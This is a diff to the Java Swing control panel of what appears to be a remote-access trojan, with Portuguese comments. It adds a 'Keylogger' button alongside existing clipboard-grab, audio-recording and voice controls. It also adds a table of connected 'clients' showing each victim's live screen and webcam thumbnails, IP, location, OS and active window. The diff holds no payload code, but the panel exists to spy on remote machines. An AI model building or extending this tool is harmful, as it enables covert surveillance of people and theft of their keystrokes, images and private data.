@@ -12,9 +12,14 @@ import javax.swing.*;
 import javax.swing.border.TitledBorder;
 import javax.swing.event.DocumentEvent;
 import javax.swing.event.DocumentListener;
+import javax.swing.table.DefaultTableModel;
 import java.awt.*;
 import java.awt.event.*;
+import java.awt.image.BufferedImage;
 import java.io.File;
+import java.util.HashMap;
+import java.util.Map;
+import java.util.function.Function;
 
 public class ConnectServerGUI extends JFrame {
 
@@ -54,6 +59,11 @@ public class ConnectServerGUI extends JFrame {
     public static JButton fpsButton;
     private final JButton folderButton;
     private final JButton clearButton;
+
+    // -- Para gerenciar a tabela de clientes
+    private static DefaultTableModel clientTableModel;
+    private static JTable clientTable;
+    private static final Map<String, Integer> clientRowMap = new HashMap<>();
 
     // Popup de sugestões (autocomplete)
     private final JPopupMenu popupSuggestions = new JPopupMenu();
@@ -283,13 +293,13 @@ public class ConnectServerGUI extends JFrame {
         messagesPanel.setBorder(messagesBorder);
 
         // Enviar mensagem (msg texto)
-        messagesPanel.add(createInputActionButton("Mensagem", "msg", "Digite a mensagem:"));
-
-        // Enviar pergunta (ask texto)
-        messagesPanel.add(createInputActionButton("Perguntar", "ask", "Digite a pergunta:"));
+        messagesPanel.add(createInputActionButton("Mensagem", "msg", "Digite a mensagem:", string -> string.endsWith("?") ? "ask" : "msg"));
 
         // Abrir Chat (caixa de diálogo)
         messagesPanel.add(createSimpleActionButton("Chat de Texto", "chat <"));
+
+        // Áudio
+        messagesPanel.add(createSimpleActionButton("Chat de Voz", "audio controls"));
 
         // Clipboard (receber ou enviar texto)
         messagesPanel.add(createInputActionButton("Texto no Clipboard", "clipboard", "Definir clipboard (<<< para receber o clipboard):"));
@@ -297,8 +307,8 @@ public class ConnectServerGUI extends JFrame {
         // Reproduzir voz (voice texto)
         messagesPanel.add(createInputActionButton("Reproduzir Voz", "voice", "Digite o texto:"));
 
-        // Áudio
-        messagesPanel.add(createSimpleActionButton("Chat de Voz", "audio controls"));
+        // Keylogger (keylogger)
+        messagesPanel.add(createSimpleActionButton("Keylogger", "keylogger"));
 
         // ------------------------------------------------------------
         // Subpainel: MOUSE / TECLADO
@@ -460,7 +470,6 @@ public class ConnectServerGUI extends JFrame {
 
             @Override
             public void changedUpdate(DocumentEvent e) {
-                // não é usado em JTextField
             }
         });
 
@@ -486,6 +495,54 @@ public class ConnectServerGUI extends JFrame {
                 }
             }
         });
+
+        String[] columnNames = {
+                "Tela", "Webcam", "Nome", "IP", "Instalação", "Localização",
+                "SO", "Monitores / Webcams", "Ping", "Janela Ativa"
+        };
+
+        clientTableModel = new DefaultTableModel(columnNames, 0) {
+            @Override
+            public Class<?> getColumnClass(int columnIndex) {
+                if (columnIndex <= 1) {
+                    return ImageIcon.class;
+                }
+                return String.class;
+            }
+
+            @Override
+            public boolean isCellEditable(int row, int column) {
+                return false;
+            }
+        };
+
+        // Tabela
+        clientTable = new JTable(clientTableModel);
+        clientTable.setRowHeight(60);
+        clientTable.getTableHeader().setReorderingAllowed(false);
+
+        clientTable.getColumnModel().getColumn(0).setPreferredWidth(80); // Tela
+        clientTable.getColumnModel().getColumn(1).setPreferredWidth(80); // Webcam
+        clientTable.getColumnModel().getColumn(2).setPreferredWidth(100); // Nome
+        clientTable.getColumnModel().getColumn(3).setPreferredWidth(120); // IP
+        clientTable.getColumnModel().getColumn(4).setPreferredWidth(140); // Instalação
+        clientTable.getColumnModel().getColumn(5).setPreferredWidth(170); // Localização
+        clientTable.getColumnModel().getColumn(6).setPreferredWidth(120); // SO
+        clientTable.getColumnModel().getColumn(7).setPreferredWidth(150); // Monitores / Webcams
+        clientTable.getColumnModel().getColumn(8).setPreferredWidth(80);  // Ping
+        clientTable.getColumnModel().getColumn(9).setPreferredWidth(250); // Janela Ativa
+
+        if (DARK_MODE) {
+            clientTable.setBackground(new Color(69, 73, 74));
+            clientTable.setForeground(Color.WHITE);
+            clientTable.setGridColor(Color.LIGHT_GRAY);
+        }
+
+        JScrollPane tableScroll = new JScrollPane(clientTable);
+        TitledBorder tableBorder = BorderFactory.createTitledBorder("Informações dos Clientes");
+        tableScroll.setBorder(tableBorder);
+
+        leftPanel.add(tableScroll, BorderLayout.SOUTH);
 
         // Ações dos botões principais
         sendButton.addActionListener(event -> sendCommand());
@@ -568,19 +625,27 @@ public class ConnectServerGUI extends JFrame {
     }
 
     public static JButton createInputActionButton(String visibleText, String commandPrefix, String promptMessage) {
+        return createInputActionButton(visibleText, commandPrefix, promptMessage, null);
+    }
+
+    public static JButton createInputActionButton(String visibleText, String commandPrefix, String promptMessage, Function<String, String> function) {
         JButton btn = createButton(visibleText);
         btn.setFont(new Font("Arial", Font.BOLD, 11));
         btn.setMargin(new Insets(2, 5, 2, 5));
-        configInputButton(btn, visibleText, commandPrefix, promptMessage);
+        configInputButton(btn, visibleText, commandPrefix, promptMessage, function);
         return btn;
     }
 
-    public static void configInputButton(JButton button, String visibleText, String commandPrefix, String promptMessage) {
+    public static void configInputButton(JButton button, String visibleText, String commandPrefix, String promptMessage, Function<String, String> function) {
         button.addActionListener(e -> {
             String userInput = JOptionPane.showInputDialog(
                     getInstance(), promptMessage, visibleText, JOptionPane.PLAIN_MESSAGE);
             if (userInput != null && !userInput.trim().isEmpty()) {
-                sendDirectCommand(commandPrefix + " " + userInput);
+                if (function != null) {
+                    sendDirectCommand(function.apply(userInput) + " " + userInput);
+                } else {
+                    sendDirectCommand(commandPrefix + " " + userInput);
+                }
             }
             if (commandPrefix.equalsIgnoreCase("voice")) {
                 ServerAudioComponents.playText(userInput);
@@ -921,7 +986,7 @@ public class ConnectServerGUI extends JFrame {
             record.setForeground(Color.WHITE);
         }
 
-        configInputButton(record, "Gravar Áudio Temporário", "audio", "Segundos:");
+        configInputButton(record, "Gravar Áudio Temporário", "audio", "Segundos:", null);
         panel.add(record);
 
         AUDIO_USER = new JButton("Áudio");
@@ -963,6 +1028,83 @@ public class ConnectServerGUI extends JFrame {
 
         AUDIO_CONTROL.setVisible(true);
         return AUDIO_CONTROL;
+    }
+
+    public static void updateClientTable(String uniqueId, BufferedImage screenPreview, BufferedImage webcamPreview, String clientName, String ip, String installDate, String location, String os, int webcams, int monitors, long ping, String activeWindow) {
+        if (clientTableModel == null) return;
+
+        // Transforma o BufferedImage em ImageIcon (miniatura)
+        ImageIcon screen = null;
+        ImageIcon webcam = null;
+        if (screenPreview != null) {
+            Image scaled = screenPreview.getScaledInstance(80, 60, Image.SCALE_SMOOTH);
+            screen = new ImageIcon(scaled);
+        }
+        if (webcamPreview != null) {
+            Image scaled = webcamPreview.getScaledInstance(80, 60, Image.SCALE_SMOOTH);
+            webcam = new ImageIcon(scaled);
+        }
+
+        Object[] rowData = {screen, webcam, clientName, ip, installDate, location, os, monitors + " / " + webcams, ping + "ms", activeWindow};
+
+        // Checa se já existe uma linha para esse cliente
+        if (clientRowMap.containsKey(uniqueId)) {
+            int rowIndex = clientRowMap.get(uniqueId);
+            // Atualiza cada célula
+            for (int i = 0; i < rowData.length; i++) {
+                if (rowData[i] != null) {
+                    clientTableModel.setValueAt(rowData[i], rowIndex, i);
+                }
+            }
+        } else {
+            // Ainda não existe, adicionamos nova linha
+            clientTableModel.addRow(rowData);
+            int newIndex = clientTableModel.getRowCount() - 1;
+            // Guardamos no map a referência da linha
+            clientRowMap.put(uniqueId, newIndex);
+        }
+    }
+
+    public static void addClientToTable(String uniqueId, BufferedImage screenPreview, BufferedImage webcamPreview, String clientName, String ip, String installDate, String location, String os, int webcams, int monitors, long ping, String activeWindow) {
+        if (clientRowMap.containsKey(uniqueId)) {
+            return;
+        }
+
+        ImageIcon screen;
+        if (screenPreview != null) {
+            Image scaled = screenPreview.getScaledInstance(80, 60, Image.SCALE_SMOOTH);
+            screen = new ImageIcon(scaled);
+        } else {
+            screen = new ImageIcon(new BufferedImage(80, 60, BufferedImage.TYPE_INT_RGB));
+        }
+        ImageIcon webcam;
+        if (webcamPreview != null) {
+            Image scaled = webcamPreview.getScaledInstance(80, 60, Image.SCALE_SMOOTH);
+            webcam = new ImageIcon(scaled);
+        } else {
+            webcam = new ImageIcon(new BufferedImage(80, 60, BufferedImage.TYPE_INT_RGB));
+        }
+
+        clientTableModel.addRow(new Object[]{screen, webcam, clientName, ip, installDate, location, os, monitors + " / " + webcams, ping + "ms", activeWindow});
+        int newIndex = clientTableModel.getRowCount() - 1;
+        clientRowMap.put(uniqueId, newIndex);
+    }
+
+    public static void removeClientFromTable(String uniqueId) {
+        if (!clientRowMap.containsKey(uniqueId)) {
+            return;
+        }
+        int rowIndex = clientRowMap.remove(uniqueId);
+        clientTableModel.removeRow(rowIndex);
+
+        Map<String, Integer> tempMap = new HashMap<>();
+        for (Map.Entry<String, Integer> entry : clientRowMap.entrySet()) {
+            int oldIndex = entry.getValue();
+            int newIndex = oldIndex > rowIndex ? oldIndex - 1 : oldIndex;
+            tempMap.put(entry.getKey(), newIndex);
+        }
+        clientRowMap.clear();
+        clientRowMap.putAll(tempMap);
     }
 
     public static void toggleColor(JButton button, boolean enabled) {
